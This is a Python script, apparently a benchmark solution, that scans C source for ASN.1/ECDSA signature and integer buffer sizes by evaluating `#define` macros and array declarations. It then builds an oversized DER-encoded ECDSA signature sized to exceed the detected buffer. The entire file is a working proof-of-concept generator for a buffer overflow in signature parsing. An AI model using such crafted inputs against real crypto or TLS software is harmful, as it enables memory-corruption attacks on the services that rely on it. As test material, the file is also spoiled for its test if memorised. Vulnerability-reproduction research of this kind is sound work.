import os
import re
import ast
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _iter_source_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    exts = {".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".inc", ".ipp", ".S", ".s"}
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                ext = os.path.splitext(fn)[1]
                if ext.lower() not in exts:
                    continue
                p = os.path.join(root, fn)
                try:
                    with open(p, "rb") as f:
                        yield p, f.read(2_000_000)
                except OSError:
                    continue
        return

    try:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    ext = os.path.splitext(m.name)[1]
                    if ext.lower() not in exts:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(2_000_000)
                        yield m.name, data
                    except Exception:
                        continue
            return
    except Exception:
        pass

    try:
        with open(src_path, "rb") as f:
            yield src_path, f.read(2_000_000)
    except OSError:
        return


def _strip_block_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c == "/" and i + 1 < n and s[i + 1] == "*":
            i += 2
            while i + 1 < n and not (s[i] == "*" and s[i + 1] == "/"):
                i += 1
            i += 2
            continue
        out.append(c)
        i += 1
    return "".join(out)


_num_suffix_re = re.compile(r"(\b0x[0-9A-Fa-f]+\b|\b\d+\b)([uUlL]+)\b")


def _normalize_c_expr(expr: str) -> str:
    expr = expr.strip()
    expr = re.sub(r"//.*", "", expr)
    expr = _num_suffix_re.sub(r"\1", expr)
    expr = expr.replace("&&", " and ").replace("||", " or ")
    expr = expr.replace("!", " not ")
    expr = expr.replace("/", "//")
    return expr.strip()


_ALLOWED_AST_NODES = (
    ast.Expression,
    ast.BinOp,
    ast.UnaryOp,
    ast.Num,
    ast.Constant,
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.FloorDiv,
    ast.Mod,
    ast.LShift,
    ast.RShift,
    ast.BitOr,
    ast.BitAnd,
    ast.BitXor,
    ast.Invert,
    ast.UAdd,
    ast.USub,
    ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
)


def _safe_eval_int(expr: str) -> Optional[int]:
    expr = _normalize_c_expr(expr)
    if not expr:
        return None
    if re.search(r"[^\dA-Fa-fxX\(\)\s\+\-\*%<>&\|\^~]", expr):
        return None
    try:
        node = ast.parse(expr, mode="eval")
    except Exception:
        return None

    for n in ast.walk(node):
        if isinstance(n, ast.Name) or isinstance(n, ast.Call) or isinstance(n, ast.Attribute) or isinstance(n, ast.Subscript):
            return None
        if not isinstance(n, _ALLOWED_AST_NODES):
            if isinstance(n, (ast.Load, ast.operator, ast.unaryop, ast.Expr)):
                continue
            return None

    def _eval(n):
        if isinstance(n, ast.Expression):
            return _eval(n.body)
        if isinstance(n, ast.Constant):
            if isinstance(n.value, (int, bool)):
                return int(n.value)
            return None
        if isinstance(n, ast.Num):
            return int(n.n)
        if isinstance(n, ast.UnaryOp):
            v = _eval(n.operand)
            if v is None:
                return None
            if isinstance(n.op, ast.UAdd):
                return +v
            if isinstance(n.op, ast.USub):
                return -v
            if isinstance(n.op, ast.Invert):
                return ~v
            return None
        if isinstance(n, ast.BinOp):
            a = _eval(n.left)
            b = _eval(n.right)
            if a is None or b is None:
                return None
            op = n.op
            try:
                if isinstance(op, ast.Add):
                    return a + b
                if isinstance(op, ast.Sub):
                    return a - b
                if isinstance(op, ast.Mult):
                    return a * b
                if isinstance(op, ast.FloorDiv):
                    if b == 0:
                        return None
                    return a // b
                if isinstance(op, ast.Mod):
                    if b == 0:
                        return None
                    return a % b
                if isinstance(op, ast.LShift):
                    return a << b
                if isinstance(op, ast.RShift):
                    return a >> b
                if isinstance(op, ast.BitOr):
                    return a | b
                if isinstance(op, ast.BitAnd):
                    return a & b
                if isinstance(op, ast.BitXor):
                    return a ^ b
            except Exception:
                return None
        return None

    v = _eval(node)
    if v is None:
        return None
    if v < 0:
        return None
    return int(v)


_ident_re = re.compile(r"\b[A-Za-z_]\w*\b")


def _try_eval_macro_expr(expr: str, values: Dict[str, int]) -> Optional[int]:
    expr = _normalize_c_expr(expr)
    if not expr:
        return None

    def repl(m):
        name = m.group(0)
        if name in values:
            return str(values[name])
        if name in ("and", "or", "not"):
            return name
        return name

    substituted = _ident_re.sub(repl, expr)
    if re.search(r"\b[A-Za-z_]\w*\b", substituted):
        if any(tok in substituted for tok in ("and", "or", "not")):
            tmp = re.sub(r"\b(and|or|not)\b", "", substituted)
            if re.search(r"\b[A-Za-z_]\w*\b", tmp):
                return None
        else:
            return None
    return _safe_eval_int(substituted)


def _encode_der_length(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 128:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _build_ecdsa_sig_der(r_len: int, s_len: int) -> bytes:
    r = b"\x01" * r_len
    s = b"\x01" * s_len
    content = b"\x02" + _encode_der_length(r_len) + r + b"\x02" + _encode_der_length(s_len) + s
    return b"\x30" + _encode_der_length(len(content)) + content


def _sig_total_size_for_k(k: int) -> int:
    lr = len(_encode_der_length(k))
    content_len = 4 + 2 * lr + 2 * k
    return 1 + len(_encode_der_length(content_len)) + content_len


def _make_der_min_ge(min_total: int, min_int_len: int) -> bytes:
    min_total = max(min_total, 8)
    min_int_len = max(min_int_len, 1)

    lo = min_int_len
    hi = max(lo + 1, (min_total // 2) + 256)
    while _sig_total_size_for_k(hi) < min_total:
        hi *= 2
        if hi > 2_000_000:
            break

    while lo < hi:
        mid = (lo + hi) // 2
        if _sig_total_size_for_k(mid) >= min_total:
            hi = mid
        else:
            lo = mid + 1
    k = lo

    sig = _build_ecdsa_sig_der(k, k)
    if len(sig) >= min_total:
        return sig

    delta = min_total - len(sig)
    sig2 = _build_ecdsa_sig_der(k, k + delta)
    if len(sig2) >= min_total:
        return sig2
    return sig2 + b"\x00" * (min_total - len(sig2))


class Solution:
    def solve(self, src_path: str) -> bytes:
        macro_exprs: Dict[str, str] = {}
        macro_vals: Dict[str, int] = {}
        relevant_texts: List[Tuple[str, str]] = []

        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$")
        for name, data in _iter_source_files(src_path):
            try:
                text = data.decode("latin1", errors="ignore")
            except Exception:
                continue

            lo = text.lower()
            if ("ecdsa" in lo) or ("asn1" in lo) or ("ecc" in lo) or ("signature" in lo) or ("sig" in lo):
                relevant_texts.append((name, text))

            for line in text.splitlines():
                m = define_re.match(line)
                if not m:
                    continue
                k = m.group(1)
                v = m.group(2).strip()
                v = re.sub(r"//.*", "", v).strip()
                if not v:
                    continue
                if "(" in v and ")" in v and v.count("(") != v.count(")"):
                    continue
                direct = _safe_eval_int(v)
                if direct is not None:
                    macro_vals[k] = direct
                else:
                    macro_exprs[k] = v

        for _ in range(12):
            progressed = False
            for k, expr in list(macro_exprs.items()):
                v = _try_eval_macro_expr(expr, macro_vals)
                if v is None:
                    continue
                if 0 <= v <= 10_000_000:
                    macro_vals[k] = v
                    del macro_exprs[k]
                    progressed = True
            if not progressed:
                break

        sig_candidates: List[Tuple[int, int, str, str]] = []
        int_candidates: List[int] = []
        asn1_ecc_file_bias = re.compile(r"(ecdsa|ecc|ec)\b", re.I)

        array_decl_re = re.compile(
            r"\b(?:unsigned\s+)?(?:char|byte|uint8_t|uint16_t|uint32_t|word16|word32|int)\s+([A-Za-z_]\w*)\s*\[\s*([^\]\n]+?)\s*\]"
        )

        for fname, text in relevant_texts:
            t = _strip_block_comments(text)
            lo = t.lower()
            is_relevant = ("asn1" in lo) and (("ecdsa" in lo) or ("ecc" in lo) or ("ec_" in lo) or ("ecdsa_" in lo) or ("ecc_" in lo))
            for m in array_decl_re.finditer(t):
                var = m.group(1)
                expr = m.group(2).strip()
                size: Optional[int]
                if re.fullmatch(r"\d+", expr):
                    size = int(expr)
                else:
                    size = _try_eval_macro_expr(expr, macro_vals)
                if size is None or size <= 0 or size > 5_000_000:
                    continue

                vlow = var.lower()
                if is_relevant and ("sig" in vlow or "asn1" in vlow or "der" in vlow):
                    score = 0
                    if "sig" in vlow:
                        score += 2
                    if "asn1" in vlow:
                        score += 3
                    if "der" in vlow:
                        score += 1
                    if re.search(r"\b(memcpy|memmove|xmemcpy|xmemmove)\s*\(\s*" + re.escape(var) + r"\s*,", t):
                        score += 6
                    if "verify" in lo or "decode" in lo or "parse" in lo:
                        score += 2
                    sig_candidates.append((score, size, var, fname))

                if is_relevant and vlow in ("r", "s", "rs", "ss", "rbuf", "sbuf", "rb", "sb", "r_bytes", "s_bytes", "rbin", "sbin"):
                    int_candidates.append(size)

        macro_sig_cands: List[int] = []
        macro_int_cands: List[int] = []
        for k, v in macro_vals.items():
            ku = k.upper()
            if 16 <= v <= 200_000:
                if "SIG" in ku and ("MAX" in ku or "DER" in ku or "ASN1" in ku or "ECDSA" in ku or "ECC" in ku):
                    macro_sig_cands.append(v)
                if ("ECC" in ku or "ECDSA" in ku or "EC" in ku) and ("BYTES" in ku or "BYTE" in ku) and ("MAX" in ku or "SIZE" in ku):
                    macro_int_cands.append(v)

        sig_buf: Optional[int] = None
        conf = 0

        if sig_candidates:
            sig_candidates.sort(key=lambda x: (-x[0], x[1]))
            best = sig_candidates[0]
            sig_buf = best[1]
            conf = 3 if best[0] >= 8 else 2
        elif macro_sig_cands:
            macro_sig_cands.sort()
            sig_buf = macro_sig_cands[0]
            conf = 1

        int_buf: Optional[int] = None
        if int_candidates:
            int_buf = max(int_candidates)
        elif macro_int_cands:
            int_buf = max(macro_int_cands)

        if conf >= 2 and sig_buf is not None and sig_buf >= 32 and sig_buf <= 500_000:
            min_total = sig_buf + 1
        elif conf == 1 and sig_buf is not None and sig_buf >= 32 and sig_buf <= 500_000:
            min_total = max(sig_buf + 1, 4096)
        else:
            min_total = 42000

        min_int_len = 1
        if int_buf is not None and 8 <= int_buf <= 500_000:
            min_int_len = int_buf + 1

        return _make_der_min_ge(min_total, min_int_len)